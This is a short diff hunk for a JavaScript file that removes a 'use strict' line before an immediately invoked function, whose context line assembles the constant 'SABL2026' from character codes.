@@ -1,5 +1,3 @@
-'use strict'
-
 (() => {
     const x1 = String.fromCharCode(83,65,66,76) + "2026";
     
